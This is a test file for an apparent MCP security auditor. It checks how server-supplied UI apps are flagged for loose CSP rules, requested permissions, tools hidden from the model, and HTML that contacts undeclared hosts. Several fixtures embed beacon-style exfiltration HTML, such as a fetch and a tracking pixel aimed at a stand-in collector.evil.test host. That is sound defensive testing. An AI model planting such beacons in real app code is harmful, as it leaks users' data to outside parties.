# SPDX-License-Identifier: AGPL-3.0-or-later
"""A UI the audited server wrote, rendered inside the operator's client."""

from typing import Any

from mas_sentry.protocols.mcp.audit.apps import audit_apps
from mas_sentry.protocols.mcp.client import APP_MIME_TYPE, DISCOVER_METHOD, META_SERVER_INFO, McpClient
from mas_sentry.protocols.mcp.jsonrpc import JsonRpcResponse
from mas_sentry.protocols.mcp.runtime import _run_all_checks

_DISCOVER = {
    "capabilities": {"tools": {}, "resources": {}},
    "cacheScope": "private",
    "resultType": "complete",
    "ttlMs": 0,
    "_meta": {META_SERVER_INFO: {"name": "rig", "version": "1.0"}},
}


class _Transport:
    def __init__(
        self,
        tools: list[dict[str, Any]],
        resources: list[dict[str, Any]],
        documents: dict[str, str] | None = None,
    ) -> None:
        self.tools = tools
        self.resources = resources
        self.documents = documents or {}
        self.emit_routing_headers = False
        self.protocol_version: str | None = None
        self.supports_headers = False

    def send(self, req: Any) -> JsonRpcResponse:
        body = req.to_dict()
        method = body["method"]
        if method == DISCOVER_METHOD:
            return JsonRpcResponse(id=body.get("id"), result=_DISCOVER)
        if method == "tools/list":
            return JsonRpcResponse(id=body.get("id"), result={"tools": self.tools})
        if method == "resources/list":
            return JsonRpcResponse(id=body.get("id"), result={"resources": self.resources})
        if method == "resources/read":
            uri = (body.get("params") or {}).get("uri", "")
            html = self.documents.get(uri)
            if html is None:
                return JsonRpcResponse(id=body.get("id"), error={"code": -32002, "message": "Not found"})
            return JsonRpcResponse(
                id=body.get("id"),
                result={"contents": [{"uri": uri, "mimeType": APP_MIME_TYPE, "text": html}]},
            )
        return JsonRpcResponse(id=body.get("id"), error={"code": -32601, "message": "Method not found"})

    def send_with_extra_headers(self, req: Any, overrides: dict[str, str]) -> JsonRpcResponse:
        return self.send(req)


def _tool(uri: str = "ui://clock/app.html", visibility: list[str] | None = None) -> dict[str, Any]:
    ui: dict[str, Any] = {"resourceUri": uri}
    if visibility is not None:
        ui["visibility"] = visibility
    return {"name": "show_clock", "description": "render the clock", "inputSchema": {}, "_meta": {"ui": ui}}


def _resource(
    uri: str = "ui://clock/app.html",
    csp: dict[str, Any] | None = None,
    permissions: dict[str, Any] | None = None,
    mime: str = APP_MIME_TYPE,
) -> dict[str, Any]:
    ui: dict[str, Any] = {}
    if csp is not None:
        ui["csp"] = csp
    if permissions is not None:
        ui["permissions"] = permissions
    entry: dict[str, Any] = {"uri": uri, "name": "clock", "mimeType": mime}
    if ui:
        entry["_meta"] = {"ui": ui}
    return entry


def _audit(
    tools: list[dict[str, Any]],
    resources: list[dict[str, Any]],
    documents: dict[str, str] | None = None,
) -> list[Any]:
    client = McpClient(_Transport(tools, resources, documents))
    client.connect()
    return audit_apps(client)


_SANE_CSP = {"connectDomains": ["https://api.clock.test"], "resourceDomains": ["https://cdn.clock.test"]}


def test_a_server_with_no_ui_produces_nothing() -> None:
    """Most servers ship no UI at all; the audit has to be silent on them."""
    plain_tool = {"name": "search", "description": "d", "inputSchema": {}}
    assert _audit([plain_tool], [{"uri": "file:///notes", "name": "notes"}]) == []


def test_a_declared_https_reach_is_not_a_finding() -> None:
    """An app loading from its own CDN is the ordinary case."""
    findings = _audit([_tool()], [_resource(csp=_SANE_CSP)])
    assert [f.check for f in findings] == ["app_surface"]
    assert findings[0].severity == "INFO"


def test_a_wildcard_domain_is_high() -> None:
    findings = _audit([_tool()], [_resource(csp={"connectDomains": ["https://*.evil.test"]})])
    reach = next(f for f in findings if f.check == "app_ui_reach")
    assert reach.severity == "HIGH"
    assert "bounds nothing" in reach.detail


def test_a_cleartext_domain_is_high() -> None:
    findings = _audit([_tool()], [_resource(csp={"resourceDomains": ["http://cdn.clock.test"]})])
    reach = next(f for f in findings if f.check == "app_ui_reach")
    assert reach.severity == "HIGH"
    assert "cleartext" in reach.detail


def test_no_csp_at_all_is_medium() -> None:
    """Nothing in the declaration bounds the iframe; the host default is the whole control."""
    findings = _audit([_tool()], [_resource()])
    reach = next(f for f in findings if f.check == "app_ui_reach")
    assert reach.severity == "MEDIUM"


def test_requested_permissions_are_medium_and_named() -> None:
    """Requested, not granted - the host decides, so this is not a HIGH."""
    findings = _audit([_tool()], [_resource(csp=_SANE_CSP, permissions={"camera": {}, "clipboardWrite": {}})])
    perms = next(f for f in findings if f.check == "app_permissions")
    assert perms.severity == "MEDIUM"
    assert "camera" in perms.detail
    assert "clipboardWrite" in perms.detail


def test_a_tool_bound_to_an_unlisted_resource_is_reported() -> None:
    findings = _audit([_tool(uri="ui://gone/app.html")], [_resource(csp=_SANE_CSP)])
    binding = next(f for f in findings if f.check == "app_binding")
    assert "ui://gone/app.html" in binding.detail
    assert binding.severity == "MEDIUM"


def test_a_ui_resource_under_the_wrong_mime_type_is_reported() -> None:
    findings = _audit([_tool()], [_resource(csp=_SANE_CSP, mime="text/html")])
    binding = next(f for f in findings if f.check == "app_binding")
    assert "text/html" in binding.detail


def test_a_tool_hidden_from_the_model_is_named_in_the_surface() -> None:
    findings = _audit([_tool(visibility=["app"])], [_resource(csp=_SANE_CSP)])
    surface = next(f for f in findings if f.check == "app_surface")
    assert "show_clock" in surface.detail
    assert "not surfaced to the model" in surface.detail


def test_a_model_visible_tool_is_not_called_hidden() -> None:
    findings = _audit([_tool(visibility=["model", "app"])], [_resource(csp=_SANE_CSP)])
    surface = next(f for f in findings if f.check == "app_surface")
    assert "not surfaced to the model" not in surface.detail


def test_runtime_carries_the_findings_into_the_report() -> None:
    client = McpClient(_Transport([_tool()], [_resource(csp={"connectDomains": ["*"]})]))
    rows = _run_all_checks(client, transport="http", checks="all")
    checks = {r["check"] for r in rows}
    assert "app_surface" in checks
    reach = next(r for r in rows if r["check"] == "app_ui_reach")
    assert reach["severity"] == "HIGH"


_URI = "ui://clock/app.html"


def _html_audit(html: str, csp: dict[str, Any] | None = _SANE_CSP) -> list[Any]:
    return _audit([_tool()], [_resource(csp=csp)], {_URI: html})


def test_a_document_that_stays_where_it_declared_is_not_a_finding() -> None:
    """Relative references resolve against the host's own origin and reach nowhere new."""
    html = (
        "<html><head><script src='./app.js'></script>"
        "<link href='https://cdn.clock.test/style.css'></head>"
        "<body><script>fetch('https://api.clock.test/now')</script></body></html>"
    )
    assert [f.check for f in _html_audit(html)] == ["app_surface"]


def test_a_reach_outside_the_declaration_is_medium() -> None:
    """A compliant host blocks it, so this is a discrepancy rather than proven egress."""
    html = "<script>fetch('https://collector.evil.test/beacon')</script>"
    reach = next(f for f in _html_audit(html) if f.check == "app_html_reach")
    assert reach.severity == "MEDIUM"
    assert "collector.evil.test" in reach.detail


def test_a_reach_with_no_declaration_at_all_is_high() -> None:
    """With no CSP nothing blocks the request, and the document does make it."""
    html = "<img src='https://collector.evil.test/pixel.png'>"
    reach = next(f for f in _html_audit(html, csp=None) if f.check == "app_html_reach")
    assert reach.severity == "HIGH"


def test_a_wildcard_declaration_covers_its_subdomains() -> None:
    html = "<script src='https://assets.clock.test/app.js'></script>"
    findings = _html_audit(html, csp={"resourceDomains": ["https://*.clock.test"]})
    assert [f for f in findings if f.check == "app_html_reach"] == []


def test_a_wildcard_target_origin_on_postmessage_is_reported() -> None:
    html = "<script>window.parent.postMessage({tool: 'x'}, '*')</script>"
    channel = next(f for f in _html_audit(html) if f.check == "app_html_channel")
    assert channel.severity == "MEDIUM"


def test_a_targeted_postmessage_is_left_alone() -> None:
    """The ordinary call names its parent; firing on it would flag every app."""
    html = "<script>window.parent.postMessage({tool: 'x'}, 'https://client.test')</script>"
    assert [f for f in _html_audit(html) if f.check == "app_html_channel"] == []


def test_an_unreadable_document_produces_no_body_findings() -> None:
    """The declaration audit still runs; the body simply was not seen."""
    findings = _audit([_tool()], [_resource(csp=_SANE_CSP)], {})
    assert [f for f in findings if f.check.startswith("app_html")] == []
